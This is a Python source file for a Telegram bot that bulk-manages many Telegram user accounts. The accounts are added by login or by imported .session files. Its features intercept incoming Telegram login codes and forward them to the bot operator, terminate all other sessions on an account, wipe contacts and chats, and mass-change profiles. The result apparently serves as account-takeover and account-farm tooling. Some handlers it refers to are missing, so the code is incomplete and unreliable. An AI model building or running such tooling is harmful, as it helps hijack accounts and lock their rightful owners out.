import asyncio
import os
import re
import random
import string
import logging
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.tl.functions.account import (
    UpdateProfileRequest, UpdateUsernameRequest,
    UpdatePasswordSettingsRequest, GetAuthorizationsRequest,
    ResetAuthorizationRequest
)
from telethon.tl.functions.contacts import DeleteContactsRequest, GetContactsRequest
from telethon.tl.functions.messages import DeleteHistoryRequest, GetDialogsRequest
from telethon.tl.functions.channels import LeaveChannelRequest
from telethon.tl.types import InputPeerEmpty
from telethon.errors import (
    FloodWaitError, UsernameOccupiedError, UsernameInvalidError,
    UsernameNotModifiedError, PhotoCropSizeSmallError, ImageProcessFailedError
)
import config

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

bot = Bot(token=config.BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

# Маппинг: telethon-клиент → telegram user_id владельца (для пересылки кодов)
code_listeners: dict[int, int] = {}  # client_id -> owner_user_id

# Хранилище сессий: {user_id: {account_index: {"client": ..., "phone": ..., "session_string": ...}}}
sessions = {}
# Временные клиенты для входа
temp_clients = {}


# ─── States ───────────────────────────────────────────────────────────────────
class AddAccount(StatesGroup):
    phone = State()
    code = State()
    password = State()

class EditName(StatesGroup):
    waiting = State()

class EditBio(StatesGroup):
    waiting = State()

class EditUsername(StatesGroup):
    base = State()

class EditAvatar(StatesGroup):
    waiting = State()

class SelectAccount(StatesGroup):
    waiting = State()


# ─── Keyboards ────────────────────────────────────────────────────────────────
def main_menu_kb():
    return ReplyKeyboardMarkup(keyboard=[
        [KeyboardButton(text="➕ Добавить аккаунт"), KeyboardButton(text="📂 Загрузить .session")],
        [KeyboardButton(text="📦 Загрузить tdata"), KeyboardButton(text="📋 Мои аккаунты")],
    ], resize_keyboard=True)

def accounts_menu_kb(user_id):
    accs = sessions.get(user_id, {})
    buttons = []
    row = []
    for idx, acc in accs.items():
        row.append(KeyboardButton(text=f"👤 {acc['phone']}"))
        if len(row) == 2:
            buttons.append(row)
            row = []
    if row:
        buttons.append(row)
    buttons.append([KeyboardButton(text="🔙 Назад")])
    return ReplyKeyboardMarkup(keyboard=buttons, resize_keyboard=True)

def account_actions_kb():
    return ReplyKeyboardMarkup(keyboard=[
        [KeyboardButton(text="✏️ Имя"), KeyboardButton(text="📝 Био")],
        [KeyboardButton(text="🔤 Юзернейм"), KeyboardButton(text="🖼 Аватарка")],
        [KeyboardButton(text="🚪 Кикнуть сессии"), KeyboardButton(text="🧹 Очистить аккаунт")],
        [KeyboardButton(text="🗑 Удалить из бота"), KeyboardButton(text="☠️ Удалить из Telegram")],
        [KeyboardButton(text="🔙 К аккаунтам")],
    ], resize_keyboard=True)

def mass_actions_kb():
    return ReplyKeyboardMarkup(keyboard=[
        [KeyboardButton(text="📛 Массово: Имя"), KeyboardButton(text="📝 Массово: Био")],
        [KeyboardButton(text="🔤 Массово: Юзернейм"), KeyboardButton(text="🖼 Массово: Аватарка")],
        [KeyboardButton(text="🚪 Массово: Кик сессий"), KeyboardButton(text="🧹 Массово: Очистить")],
        [KeyboardButton(text="🔙 Назад")],
    ], resize_keyboard=True)

def cancel_kb():
    return ReplyKeyboardMarkup(keyboard=[
        [KeyboardButton(text="❌ Отмена")]
    ], resize_keyboard=True)


# ─── Helpers ──────────────────────────────────────────────────────────────────
def get_user_sessions(user_id):
    return sessions.get(user_id, {})

def get_selected_account(user_id, state_data):
    idx = state_data.get("selected_account")
    if idx is None:
        return None
    return sessions.get(user_id, {}).get(idx)

async def add_suffix_unique(base: str, client: TelegramClient, max_attempts: int = 10) -> str | None:
    """
    FIX: Подбирает реально свободный юзернейм через проверку в API.
    Возвращает свободный юзернейм или None если не нашёл.
    """
    chars = string.ascii_lowercase + string.digits
    for _ in range(max_attempts):
        # Генерируем суффикс 3-4 символа для лучшей уникальности
        suffix_len = random.randint(3, 5)
        suffix = ''.join(random.choices(chars, k=suffix_len))
        candidate = base + suffix

        if len(candidate) < 5 or len(candidate) > 32:
            continue

        try:
            # Проверяем занятость через поиск
            result = await client.get_entity(f"@{candidate}")
            # Если нашли — занят, пробуем следующий
            continue
        except ValueError:
            # ValueError = такого пользователя нет = юзернейм свободен
            return candidate
        except Exception:
            # Любая другая ошибка — считаем свободным и пробуем
            return candidate

    return None

async def get_client(acc) -> TelegramClient:
    """FIX: Получает подключённый клиент, переподключает если нужно."""
    if acc is None:
        raise ValueError("acc is None — аккаунт не передан")

    # Если клиент уже есть в acc и подключён — используем его
    existing = acc.get("client")
    if existing and existing.is_connected():
        return existing

    # Пересоздаём клиент из session_string
    session_str = acc.get("session_string")
    if not session_str:
        raise ValueError("session_string пустой или отсутствует")

    client = TelegramClient(
        StringSession(session_str),
        config.API_ID,
        config.API_HASH
    )
    await client.connect()

    if not await client.is_user_authorized():
        raise ValueError("Сессия устарела или недействительна — требуется повторный вход")

    # Обновляем клиент в хранилище
    acc["client"] = client
    return client


# ─── Авто-пересылка кодов ─────────────────────────────────────────────────────
CODE_PATTERN = re.compile(
    r"(?:"
    r"(?:код|code|login code|confirmation code|ваш код|your code)[^\d]{0,30}(\d{5,6})"
    r"|"
    r"\b(\d{5,6})\b"
    r")",
    re.IGNORECASE
)

TRUSTED_SENDERS = {
    "Telegram",
    "+42777",
    777000,
}

def attach_code_listener(client: TelegramClient, owner_user_id: int, phone: str):
    """Вешает на клиент слушатель входящих сообщений с кодами."""

    @client.on(events.NewMessage(incoming=True))
    async def _code_listener(event):
        try:
            sender = await event.get_sender()
            sender_id = getattr(sender, "id", None)
            sender_username = getattr(sender, "username", None) or ""
            sender_first = getattr(sender, "first_name", None) or ""
            sender_phone = getattr(sender, "phone", None) or ""

            is_trusted = (
                sender_id == 777000
                or sender_phone in TRUSTED_SENDERS
                or sender_first in TRUSTED_SENDERS
                or sender_username.lower() in {"telegram", "telegramservice"}
            )

            text = event.raw_text or ""
            has_code_word = bool(re.search(r"\b(код|code)\b", text, re.IGNORECASE))

            if not is_trusted and not has_code_word:
                return

            match = CODE_PATTERN.search(text)
            if not match:
                return

            code = match.group(1) or match.group(2)
            if not code:
                return

            sender_label = sender_first or sender_username or str(sender_id)
            await bot.send_message(
                owner_user_id,
                f"🔑 <b>Код для {phone}</b>\n\n"
                f"От: <b>{sender_label}</b>\n"
                f"Код: <code>{code}</code>\n\n"
                f"📩 Сообщение:\n<i>{text[:400]}</i>",
                parse_mode="HTML"
            )
            logger.info(f"[CodeFwd] {phone} → {owner_user_id}: {code}")
        except Exception as e:
            logger.warning(f"[CodeFwd] ошибка пересылки: {e}")


# ─── /start ───────────────────────────────────────────────────────────────────
@dp.message(F.text == "/start")
async def cmd_start(message: Message, state: FSMContext):
    await state.clear()
    await message.answer(
        "👋 <b>Менеджер Telegram аккаунтов</b>\n\nВыбери действие:",
        reply_markup=main_menu_kb(),
        parse_mode="HTML"
    )


# ─── Добавить аккаунт ─────────────────────────────────────────────────────────
@dp.message(F.text == "➕ Добавить аккаунт")
async def add_account_start(message: Message, state: FSMContext):
    await state.set_state(AddAccount.phone)
    await message.answer("📱 Введи номер телефона (с +):", reply_markup=cancel_kb())

@dp.message(AddAccount.phone)
async def add_account_phone(message: Message, state: FSMContext):
    if message.text == "❌ Отмена":
        await state.clear()
        await message.answer("Отменено.", reply_markup=main_menu_kb())
        return

    phone = message.text.strip()
    user_id = message.from_user.id

    client = TelegramClient(StringSession(), config.API_ID, config.API_HASH)
    await client.connect()

    try:
        result = await client.send_code_request(phone)
        temp_clients[user_id] = {"client": client, "phone": phone, "phone_code_hash": result.phone_code_hash}
        await state.update_data(phone=phone)
        await state.set_state(AddAccount.code)
        await message.answer("✅ Код отправлен!\n\n📲 Введи код из Telegram (без пробелов, например: 12345):")
    except Exception as e:
        await client.disconnect()
        await message.answer(f"❌ Ошибка: {e}", reply_markup=main_menu_kb())
        await state.clear()

@dp.message(AddAccount.code)
async def add_account_code(message: Message, state: FSMContext):
    if message.text == "❌ Отмена":
        await state.clear()
        user_id = message.from_user.id
        if user_id in temp_clients:
            await temp_clients[user_id]["client"].disconnect()
            del temp_clients[user_id]
        await message.answer("Отменено.", reply_markup=main_menu_kb())
        return

    code = message.text.strip()
    user_id = message.from_user.id
    tmp = temp_clients.get(user_id)

    if not tmp:
        await message.answer("❌ Сессия истекла. Начни заново.", reply_markup=main_menu_kb())
        await state.clear()
        return

    try:
        await tmp["client"].sign_in(tmp["phone"], code, phone_code_hash=tmp["phone_code_hash"])
        await _save_session(user_id, tmp["client"], tmp["phone"], message, state)
    except Exception as e:
        err_name = type(e).__name__
        if "password" in str(e).lower() or "2fa" in str(e).lower() or "SessionPasswordNeeded" in err_name:
            await state.set_state(AddAccount.password)
            await message.answer("🔐 Требуется пароль 2FA. Введи пароль:")
        else:
            await message.answer(f"❌ Ошибка: {e}", reply_markup=main_menu_kb())
            await state.clear()

@dp.message(AddAccount.password)
async def add_account_password(message: Message, state: FSMContext):
    if message.text == "❌ Отмена":
        await state.clear()
        user_id = message.from_user.id
        if user_id in temp_clients:
            await temp_clients[user_id]["client"].disconnect()
            del temp_clients[user_id]
        await message.answer("Отменено.", reply_markup=main_menu_kb())
        return

    password = message.text.strip()
    user_id = message.from_user.id
    tmp = temp_clients.get(user_id)

    if not tmp:
        await message.answer("❌ Сессия истекла. Начни заново.", reply_markup=main_menu_kb())
        await state.clear()
        return

    try:
        await tmp["client"].sign_in(password=password)
        await _save_session(user_id, tmp["client"], tmp["phone"], message, state)
    except Exception as e:
        await message.answer(f"❌ Неверный пароль: {e}", reply_markup=main_menu_kb())
        await state.clear()

async def _save_session(user_id, client, phone, message, state):
    session_string = client.session.save()
    if user_id not in sessions:
        sessions[user_id] = {}
    idx = len(sessions[user_id])
    sessions[user_id][idx] = {
        "phone": phone,
        "session_string": session_string,
        "client": client
    }
    attach_code_listener(client, user_id, phone)
    if user_id in temp_clients:
        del temp_clients[user_id]
    await state.clear()
    await message.answer(
        f"✅ Аккаунт <b>{phone}</b> успешно добавлен!\n"
        f"🔔 Автопересылка кодов <b>включена</b> для этого аккаунта.",
        reply_markup=main_menu_kb(),
        parse_mode="HTML"
    )


# ─── Загрузить .session файл ──────────────────────────────────────────────────
@dp.message(F.text == "📂 Загрузить .session")
async def load_session_file(message: Message, state: FSMContext):
    await message.answer("📎 Отправь .session файл (Telethon):", reply_markup=cancel_kb())
    await state.set_state(SelectAccount.waiting)
    await state.update_data(action="load_session_file")

def _extract_session_string(path: str) -> str:
    """
    FIX: Конвертирует .session файл в StringSession строку.
    Поддерживает:
      1. Уже готовую StringSession строку (текстовый файл)
      2. SQLite-базу Telethon (бинарный .session файл)
    """
    # Пробуем как текст (уже StringSession)
    try:
        with open(path, "r", encoding="utf-8") as f:
            content = f.read().strip()
        if content and len(content) > 20 and not content.startswith("SQLite"):
            # Валидируем что это рабочая StringSession
            test = StringSession(content)
            if test.save():
                return content
    except Exception:
        pass

    # Пробуем как SQLite (стандартный формат Telethon SQLiteSession)
    import sqlite3
    try:
        conn = sqlite3.connect(path)
        cursor = conn.cursor()

        # Telethon хранит данные в таблице sessions
        cursor.execute("SELECT dc_id, server_address, port, auth_key FROM sessions LIMIT 1")
        row = cursor.fetchone()
        conn.close()

        if not row:
            raise ValueError("Таблица sessions пустая")

        dc_id, server_address, port, auth_key_bytes = row

        if not auth_key_bytes:
            raise ValueError("auth_key пустой")

        # FIX: Правильная сборка StringSession из SQLite данных
        # StringSession формат Telethon: версия(1) + dc_id(1) + ip(4 или 16) + port(2) + auth_key(256)
        import struct
        import base64

        # Определяем IPv4 или IPv6
        try:
            import socket
            socket.inet_pton(socket.AF_INET, server_address)
            ip_bytes = socket.inet_aton(server_address)  # 4 bytes
            ipv6 = False
        except OSError:
            ip_bytes = socket.inet_pton(socket.AF_INET6, server_address)  # 16 bytes
            ipv6 = True

        # auth_key должен быть 256 байт
        if isinstance(auth_key_bytes, bytes):
            key = auth_key_bytes
        else:
            key = bytes(auth_key_bytes)

        # Дополняем до 256 байт если нужно
        if len(key) < 256:
            key = key.ljust(256, b'\x00')
        elif len(key) > 256:
            key = key[:256]

        # Собираем бинарный пакет
        # Формат: dc_id(1B) + ip(4B) + port(2B) + key(256B) — итого 263 байта
        packed = struct.pack('>B', dc_id) + ip_bytes + struct.pack('>H', port) + key

        # Кодируем в base64url без паддинга (формат Telethon StringSession)
        session_str = "1" + base64.urlsafe_b64encode(packed).decode("ascii")

        # Проверяем что получился валидный StringSession
        test = StringSession(session_str)
        if not test.save():
            raise ValueError("Сгенерированная StringSession невалидна")

        return session_str

    except Exception as e:
        logger.warning(f"[SessionLoad] SQLite конвертация не удалась: {e}")
        raise ValueError(f"Не удалось прочитать .session файл: {e}")


@dp.message(F.document)
async def handle_document(message: Message, state: FSMContext):
    data = await state.get_data()
    if data.get("action") == "load_tdata_file":
        await handle_tdata_document(message, state)
        return
    if data.get("action") != "load_session_file":
        return

    if not message.document.file_name.endswith(".session"):
        await message.answer("❌ Нужен файл с расширением .session")
        return

    user_id = message.from_user.id
    file = await bot.get_file(message.document.file_id)
    path = f"/tmp/{user_id}_{message.document.file_name}"
    await bot.download_file(file.file_path, path)

    try:
        session_string = _extract_session_string(path)
        client = TelegramClient(StringSession(session_string), config.API_ID, config.API_HASH)
        await client.connect()

        if not await client.is_user_authorized():
            raise ValueError("Сессия недействительна — аккаунт не авторизован")

        me = await client.get_me()
        if me is None:
            raise ValueError("Не удалось получить данные аккаунта")

        phone = me.phone or f"id{me.id}"
        if phone and not phone.startswith("+"):
            phone = f"+{phone}"

        if user_id not in sessions:
            sessions[user_id] = {}
        idx = len(sessions[user_id])
        sessions[user_id][idx] = {
            "phone": phone,
            "session_string": session_string,
            "client": client
        }
        attach_code_listener(client, user_id, phone)
        await state.clear()
        await message.answer(
            f"✅ Аккаунт <b>{phone}</b> загружен!\n"
            f"🔔 Автопересылка кодов <b>включена</b> для этого аккаунта.",
            reply_markup=main_menu_kb(), parse_mode="HTML"
        )
    except Exception as e:
        await message.answer(f"❌ Ошибка при загрузке сессии: {e}", reply_markup=main_menu_kb())
        await state.clear()
    finally:
        if os.path.exists(path):
            os.remove(path)


# ─── Список аккаунтов ─────────────────────────────────────────────────────────
@dp.message(F.text == "📋 Мои аккаунты")
async def list_accounts(message: Message, state: FSMContext):
    await state.clear()
    user_id = message.from_user.id
    accs = get_user_sessions(user_id)
    if not accs:
        await message.answer("❌ Нет аккаунтов. Добавь через кнопку ниже.", reply_markup=main_menu_kb())
        return

    text = "📋 <b>Твои аккаунты:</b>\n\n"
    for idx, acc in accs.items():
        text += f"• {acc['phone']}\n"

    buttons = [[KeyboardButton(text="🔧 Массовые действия")]]
    row = []
    for idx, acc in accs.items():
        row.append(KeyboardButton(text=f"👤 {acc['phone']}"))
        if len(row) == 2:
            buttons.append(row)
            row = []
    if row:
        buttons.append(row)
    buttons.append([KeyboardButton(text="🔙 Назад")])

    kb = ReplyKeyboardMarkup(keyboard=buttons, resize_keyboard=True)
    await message.answer(text, reply_markup=kb, parse_mode="HTML")
    await state.set_state(SelectAccount.waiting)
    await state.update_data(action="select")


# ─── Выбор аккаунта ───────────────────────────────────────────────────────────
@dp.message(SelectAccount.waiting)
async def select_account(message: Message, state: FSMContext):
    user_id = message.from_user.id
    data = await state.get_data()

    if message.text == "🔙 Назад":
        await state.clear()
        await message.answer("Главное меню:", reply_markup=main_menu_kb())
        return

    if message.text == "❌ Отмена":
        await state.clear()
        await message.answer("Отменено.", reply_markup=main_menu_kb())
        return

    if message.text == "🔧 Массовые действия":
        await state.clear()
        await message.answer("🔧 Массовые действия на всех аккаунтах:", reply_markup=mass_actions_kb())
        return

    # FIX: Ищем аккаунт по номеру
    accs = get_user_sessions(user_id)
    selected_idx = None
    for idx, acc in accs.items():
        if message.text == f"👤 {acc['phone']}":
            selected_idx = idx
            break

    if selected_idx is None:
        await message.answer("❌ Аккаунт не найден. Выбери из списка.", reply_markup=accounts_menu_kb(user_id))
        return

    # FIX: НЕ делаем state.clear() перед update_data — иначе данные теряются
    await state.update_data(selected_account=selected_idx)
    await state.set_state(None)  # Выходим из SelectAccount без потери данных

    acc = accs[selected_idx]
    await message.answer(
        f"👤 <b>Аккаунт: {acc['phone']}</b>\n\nВыбери действие:",
        reply_markup=account_actions_kb(),
        parse_mode="HTML"
    )


# ─── Действия с аккаунтом ─────────────────────────────────────────────────────
@dp.message(F.text == "🔙 К аккаунтам")
async def back_to_accounts(message: Message, state: FSMContext):
    await state.clear()
    await list_accounts(message, state)

@dp.message(F.text == "✏️ Имя")
async def change_name(message: Message, state: FSMContext):
    data = await state.get_data()
    user_id = message.from_user.id
    # FIX: Сохраняем selected_account перед сменой стейта
    selected = data.get("selected_account")
    await state.set_state(EditName.waiting)
    if selected is not None:
        await state.update_data(selected_account=selected)
    await message.answer("✏️ Введи новое имя (Имя|Фамилия или просто Имя):", reply_markup=cancel_kb())

@dp.message(EditName.waiting)
async def apply_name(message: Message, state: FSMContext):
    if message.text == "❌ Отмена":
        await state.clear()
        await message.answer("Отменено.", reply_markup=account_actions_kb())
        return

    data = await state.get_data()
    user_id = message.from_user.id
    is_mass = data.get("mass", False)

    if is_mass:
        accs = get_user_sessions(user_id)
        if not accs:
            await message.answer("❌ Нет аккаунтов.", reply_markup=main_menu_kb())
            await state.clear()
            return

        parts = message.text.strip().split("|")
        first = parts[0].strip()
        last = parts[1].strip() if len(parts) > 1 else ""

        await message.answer(f"⏳ Меняю имя на {len(accs)} аккаунтах...")
        results = []
        for idx, acc in accs.items():
            try:
                client = await get_client(acc)
                await client(UpdateProfileRequest(first_name=first, last_name=last))
                results.append(f"✅ <code>{acc['phone']}</code>")
                await asyncio.sleep(0.5)
            except FloodWaitError as e:
                await asyncio.sleep(e.seconds)
                try:
                    client = await get_client(acc)
                    await client(UpdateProfileRequest(first_name=first, last_name=last))
                    results.append(f"✅ <code>{acc['phone']}</code>")
                except Exception as e2:
                    results.append(f"❌ <code>{acc['phone']}</code>: {e2}")
            except Exception as e:
                results.append(f"❌ <code>{acc['phone']}</code>: {e}")

        await message.answer(
            "📋 <b>Результат:</b>\n\n" + "\n".join(results),
            reply_markup=mass_actions_kb(), parse_mode="HTML"
        )
    else:
        acc = get_selected_account(user_id, data)
        if not acc:
            await message.answer("❌ Аккаунт не найден. Вернись и выбери заново.", reply_markup=main_menu_kb())
            await state.clear()
            return

        parts = message.text.strip().split("|")
        first = parts[0].strip()
        last = parts[1].strip() if len(parts) > 1 else ""

        try:
            client = await get_client(acc)
            await client(UpdateProfileRequest(first_name=first, last_name=last))
            await message.answer(
                f"✅ Имя изменено: <b>{first} {last}</b>",
                reply_markup=account_actions_kb(), parse_mode="HTML"
            )
        except Exception as e:
            await message.answer(f"❌ Ошибка: {e}", reply_markup=account_actions_kb())

    await state.clear()


@dp.message(F.text == "📝 Био")
async def change_bio(message: Message, state: FSMContext):
    data = await state.get_data()
    selected = data.get("selected_account")
    await state.set_state(EditBio.waiting)
    if selected is not None:
        await state.update_data(selected_account=selected)
    await message.answer("📝 Введи новое био:", reply_markup=cancel_kb())

@dp.message(EditBio.waiting)
async def apply_bio(message: Message, state: FSMContext):
    if message.text == "❌ Отмена":
        await state.clear()
        await message.answer("Отменено.", reply_markup=account_actions_kb())
        return

    data = await state.get_data()
    user_id = message.from_user.id
    is_mass = data.get("mass", False)

    if is_mass:
        accs = get_user_sessions(user_id)
        if not accs:
            await message.answer("❌ Нет аккаунтов.", reply_markup=main_menu_kb())
            await state.clear()
            return

        bio_text = message.text.strip()
        await message.answer(f"⏳ Меняю био на {len(accs)} аккаунтах...")
        results = []
        for idx, acc in accs.items():
            try:
                client = await get_client(acc)
                await client(UpdateProfileRequest(about=bio_text))
                results.append(f"✅ <code>{acc['phone']}</code>")
                await asyncio.sleep(0.5)
            except FloodWaitError as e:
                await asyncio.sleep(e.seconds)
                try:
                    client = await get_client(acc)
                    await client(UpdateProfileRequest(about=bio_text))
                    results.append(f"✅ <code>{acc['phone']}</code>")
                except Exception as e2:
                    results.append(f"❌ <code>{acc['phone']}</code>: {e2}")
            except Exception as e:
                results.append(f"❌ <code>{acc['phone']}</code>: {e}")

        await message.answer(
            "📋 <b>Результат смены био:</b>\n\n" + "\n".join(results),
            reply_markup=mass_actions_kb(), parse_mode="HTML"
        )
    else:
        acc = get_selected_account(user_id, data)
        if not acc:
            await message.answer("❌ Аккаунт не найден. Вернись и выбери заново.", reply_markup=main_menu_kb())
            await state.clear()
            return

        try:
            client = await get_client(acc)
            await client(UpdateProfileRequest(about=message.text.strip()))
            await message.answer("✅ Био обновлено!", reply_markup=account_actions_kb())
        except Exception as e:
            await message.answer(f"❌ Ошибка: {e}", reply_markup=account_actions_kb())

    await state.clear()


@dp.message(F.text == "🔤 Юзернейм")
async def change_username(message: Message, state: FSMContext):
    data = await state.get_data()
    selected = data.get("selected_account")
    await state.set_state(EditUsername.base)
    if selected is not None:
        await state.update_data(selected_account=selected)
    await message.answer(
        "🔤 Введи базовый юзернейм.\n\nБот добавит уникальный суффикс и <b>проверит свободен ли он</b> перед установкой.\n"
        "Пример: дашь <code>qwert</code> → бот найдёт свободный <code>qwert4f2</code>",
        reply_markup=cancel_kb(), parse_mode="HTML"
    )

@dp.message(EditUsername.base)
async def apply_username(message: Message, state: FSMContext):
    if message.text == "❌ Отмена":
        await state.clear()
        await message.answer("Отменено.", reply_markup=account_actions_kb())
        return

    data = await state.get_data()
    user_id = message.from_user.id
    is_mass = data.get("mass", False)
    base = message.text.strip().lstrip("@")

    # Базовая валидация
    if not re.match(r'^[a-zA-Z0-9_]{1,28}$', base):
        await message.answer(
            "❌ Некорректный базовый юзернейм.\nТолько латинские буквы, цифры и _",
            reply_markup=cancel_kb()
        )
        return

    if is_mass:
        accs = get_user_sessions(user_id)
        if not accs:
            await message.answer("❌ Нет аккаунтов.", reply_markup=main_menu_kb())
            await state.clear()
            return

        await message.answer(f"⏳ Ищу свободные юзернеймы и меняю на {len(accs)} аккаунтах...")
        results = []
        for idx, acc in accs.items():
            try:
                client = await get_client(acc)
                # FIX: Реальная проверка свободности через API
                new_username = await add_suffix_unique(base, client, max_attempts=15)
                if new_username is None:
                    results.append(f"❌ <code>{acc['phone']}</code> → не нашёл свободный юз, попробуй другой базовый")
                    continue

                await client(UpdateUsernameRequest(new_username))
                results.append(f"✅ <code>{acc['phone']}</code> → <b>@{new_username}</b>")
                await asyncio.sleep(1.0)

            except UsernameNotModifiedError:
                results.append(f"ℹ️ <code>{acc['phone']}</code> → юзернейм уже такой")
            except UsernameInvalidError:
                results.append(f"❌ <code>{acc['phone']}</code> → недопустимый юзернейм")
            except FloodWaitError as e:
                results.append(f"⏳ <code>{acc['phone']}</code> → флуд {e.seconds}с, пропущено")
                await asyncio.sleep(min(e.seconds, 30))
            except Exception as e:
                results.append(f"❌ <code>{acc['phone']}</code> → {e}")

        text = "📋 <b>Результат смены юзернеймов:</b>\n\n" + "\n".join(results)
        if len(text) > 4000:
            chunks = [results[i:i+20] for i in range(0, len(results), 20)]
            for chunk in chunks:
                await message.answer("📋 <b>Юзернеймы:</b>\n\n" + "\n".join(chunk), reply_markup=mass_actions_kb(), parse_mode="HTML")
        else:
            await message.answer(text, reply_markup=mass_actions_kb(), parse_mode="HTML")

    else:
        acc = get_selected_account(user_id, data)
        if not acc:
            await message.answer("❌ Аккаунт не найден. Вернись и выбери заново.", reply_markup=main_menu_kb())
            await state.clear()
            return

        try:
            client = await get_client(acc)
            # FIX: Реальная проверка свободности через API
            new_username = await add_suffix_unique(base, client, max_attempts=15)
            if new_username is None:
                await message.answer(
                    "❌ Не удалось найти свободный юзернейм после 15 попыток.\nПопробуй другой базовый.",
                    reply_markup=account_actions_kb()
                )
                await state.clear()
                return

            await client(UpdateUsernameRequest(new_username))
            await message.answer(
                f"✅ Готово!\n\n📋 <b>Установленный юзернейм:</b>\n"
                f"<code>{acc['phone']}</code> → <b>@{new_username}</b>",
                reply_markup=account_actions_kb(), parse_mode="HTML"
            )
        except UsernameNotModifiedError:
            await message.answer("ℹ️ Юзернейм уже такой.", reply_markup=account_actions_kb())
        except UsernameInvalidError:
            await message.answer("❌ Недопустимый юзернейм.", reply_markup=account_actions_kb())
        except FloodWaitError as e:
            await message.answer(f"⏳ Флуд-контроль: подожди {e.seconds} секунд.", reply_markup=account_actions_kb())
        except Exception as e:
            await message.answer(f"❌ Ошибка: {e}", reply_markup=account_actions_kb())

    await state.clear()


@dp.message(F.text == "🖼 Аватарка")
async def change_avatar(message: Message, state: FSMContext):
    data = await state.get_data()
    selected = data.get("selected_account")
    await state.set_state(EditAvatar.waiting)
    if selected is not None:
        await state.update_data(selected_account=selected)
    await message.answer("🖼 Отправь фото для аватарки:", reply_markup=cancel_kb())

@dp.message(EditAvatar.waiting, F.photo)
async def apply_avatar(message: Message, state: FSMContext):
    data = await state.get_data()
    user_id = message.from_user.id
    is_mass = data.get("mass", False)

    # Скачиваем фото
    photo = message.photo[-1]
    file = await bot.get_file(photo.file_id)
    path = f"/tmp/{user_id}_avatar.jpg"
    await bot.download_file(file.file_path, path)

    try:
        if is_mass:
            accs = get_user_sessions(user_id)
            if not accs:
                await message.answer("❌ Нет аккаунтов.", reply_markup=main_menu_kb())
                await state.clear()
                return

            await message.answer(f"⏳ Ставлю аватарку на {len(accs)} аккаунтах...")
            results = []
            for idx, acc in accs.items():
                try:
                    client = await get_client(acc)
                    await client.upload_profile_photo(path)
                    results.append(f"✅ <code>{acc['phone']}</code>")
                    await asyncio.sleep(1.0)
                except FloodWaitError as e:
                    await asyncio.sleep(min(e.seconds, 30))
                    try:
                        client = await get_client(acc)
                        await client.upload_profile_photo(path)
                        results.append(f"✅ <code>{acc['phone']}</code>")
                    except Exception as e2:
                        results.append(f"❌ <code>{acc['phone']}</code>: {e2}")
                except (PhotoCropSizeSmallError, ImageProcessFailedError) as e:
                    results.append(f"❌ <code>{acc['phone']}</code>: фото слишком маленькое или плохое качество")
                except Exception as e:
                    results.append(f"❌ <code>{acc['phone']}</code>: {e}")

            await message.answer(
                "📋 <b>Результат смены аватарок:</b>\n\n" + "\n".join(results),
                reply_markup=mass_actions_kb(), parse_mode="HTML"
            )
        else:
            acc = get_selected_account(user_id, data)
            if not acc:
                await message.answer("❌ Аккаунт не найден. Вернись и выбери заново.", reply_markup=main_menu_kb())
                await state.clear()
                return

            client = await get_client(acc)
            await client.upload_profile_photo(path)
            await message.answer("✅ Аватарка обновлена!", reply_markup=account_actions_kb())

    except (PhotoCropSizeSmallError, ImageProcessFailedError):
        await message.answer("❌ Фото слишком маленькое или плохого качества. Отправь другое.", reply_markup=account_actions_kb())
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}", reply_markup=account_actions_kb())
    finally:
        if os.path.exists(path):
            os.remove(path)

    await state.clear()


# ─── Кик сессий ───────────────────────────────────────────────────────────────
@dp.message(F.text == "🚪 Кикнуть сессии")
async def kick_sessions(message: Message, state: FSMContext):
    data = await state.get_data()
    user_id = message.from_user.id
    acc = get_selected_account(user_id, data)
    if not acc:
        await message.answer("❌ Сначала выбери аккаунт.", reply_markup=main_menu_kb())
        return

    await message.answer("⏳ Кикаю все посторонние сессии...")
    try:
        client = await get_client(acc)
        auths = await client(GetAuthorizationsRequest())
        kicked = 0
        for auth in auths.authorizations:
            if not auth.current:
                await client(ResetAuthorizationRequest(hash=auth.hash))
                kicked += 1
        await message.answer(f"✅ Кикнуто сессий: {kicked}", reply_markup=account_actions_kb())
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}", reply_markup=account_actions_kb())


# ─── Очистка аккаунта ─────────────────────────────────────────────────────────
@dp.message(F.text == "🧹 Очистить аккаунт")
async def clean_account(message: Message, state: FSMContext):
    data = await state.get_data()
    user_id = message.from_user.id
    acc = get_selected_account(user_id, data)
    if not acc:
        await message.answer("❌ Сначала выбери аккаунт.", reply_markup=main_menu_kb())
        return

    await message.answer("⏳ Очищаю аккаунт (контакты, чаты, каналы)...")
    try:
        client = await get_client(acc)
        try:
            contacts = await client(GetContactsRequest(hash=0))
            if contacts.users:
                ids = [u.id for u in contacts.users]
                await client(DeleteContactsRequest(id=ids))
        except Exception:
            pass

        dialogs = await client.get_dialogs(limit=200)
        cleaned = 0
        for dialog in dialogs:
            try:
                entity = dialog.entity
                if hasattr(entity, 'broadcast') and entity.broadcast:
                    await client(LeaveChannelRequest(entity))
                elif hasattr(entity, 'megagroup') and entity.megagroup:
                    await client(LeaveChannelRequest(entity))
                else:
                    await client(DeleteHistoryRequest(peer=entity, max_id=0, just_clear=False, revoke=True))
                cleaned += 1
                await asyncio.sleep(0.3)
            except Exception:
                pass

        await message.answer(f"✅ Очищено диалогов/каналов: {cleaned}\nКонтакты удалены.", reply_markup=account_actions_kb())
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}", reply_markup=account_actions_kb())


# ─── Массовые действия ────────────────────────────────────────────────────────
@dp.message(F.text == "🔧 Массовые действия")
async def mass_actions(message: Message, state: FSMContext):
    await state.clear()
    await message.answer("🔧 Массовые действия:", reply_markup=mass_actions_kb())

@dp.message(F.text == "📛 Массово: Имя")
async def mass_name(message: Message, state: FSMContext):
    await state.set_state(EditName.waiting)
    await state.update_data(mass=True)
    await message.answer("✏️ Введи имя (Имя|Фамилия):", reply_markup=cancel_kb())

@dp.message(F.text == "📝 Массово: Био")
async def mass_bio(message: Message, state: FSMContext):
    await state.set_state(EditBio.waiting)
    await state.update_data(mass=True)
    await message.answer("📝 Введи био:", reply_markup=cancel_kb())

